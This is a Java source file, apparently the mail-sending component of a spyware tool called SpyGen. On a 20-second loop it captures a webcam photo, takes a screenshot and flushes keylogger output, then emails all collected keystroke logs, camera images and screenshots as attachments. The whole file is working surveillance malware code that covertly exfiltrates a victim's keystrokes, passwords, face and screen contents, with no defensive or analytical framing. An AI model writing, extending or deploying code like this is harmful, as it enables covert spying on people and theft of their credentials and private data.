package com.houarizegai.spygen.mail;

import com.houarizegai.spygen.global.Settings;
import com.houarizegai.spygen.global.Utils;
import com.houarizegai.spygen.keylogger.Keylogger;
import com.houarizegai.spygen.screenshot.Screenshot;
import com.houarizegai.spygen.webcam.Camera;

import java.io.File;
import java.util.Date;

public class SenderService implements Runnable {

    private Thread service;

    public SenderService() {
        service = new Thread(this, "Manage service");
        service.start();
    }

    @Override
    public void run() {
        long start = System.nanoTime();
        while(true) {
            long elapsed = (System.nanoTime() - start) / 1_000_000;
            if(elapsed > 20_000) { // Send email every time period (you can augment the time as you like!)
                try {
                    Camera.takePicture("capture_" + new Date().toString().replace(" ", "_"));
                    Screenshot.takeScreenshot("screenshot_" + new Date().toString().replace(" ", "_"));
                    Keylogger.keyboard.onSave();

                    SendEmail sendEmail = new SendEmail("SpyGen result", "this result send it at data: " + new Date().toString());

                    File folder = new File(Settings.KEYLOGGER_PATH);
                    File[] listOfFiles = folder.listFiles();
                    for (int i = 0; i < listOfFiles.length; i++) {
                        if (listOfFiles[i].isFile()) {
                            sendEmail.attach(listOfFiles[i].getPath(), "Logs");
                        }
                    }

                    folder = new File(Settings.WEBCAM_PATH);
                    listOfFiles = folder.listFiles();
                    for (int i = 0; i < listOfFiles.length; i++) {
                        if (listOfFiles[i].isFile()) {
                            sendEmail.attach(listOfFiles[i].getPath(), "Camera");
                        }
                    }

                    folder = new File(Settings.SCREENSHOT_PATH);
                    listOfFiles = folder.listFiles();
                    for (int i = 0; i < listOfFiles.length; i++) {
                        if (listOfFiles[i].isFile()) {
                            sendEmail.attach(listOfFiles[i].getPath(), "Screenshot");
                        }
                    }

                    sendEmail.send();
                } catch(Throwable e) {
                    e.printStackTrace();
                    Keylogger.keyboard.onFail();
                }

                start = System.nanoTime(); // Reset the timer
            }
        }
    }
    
}
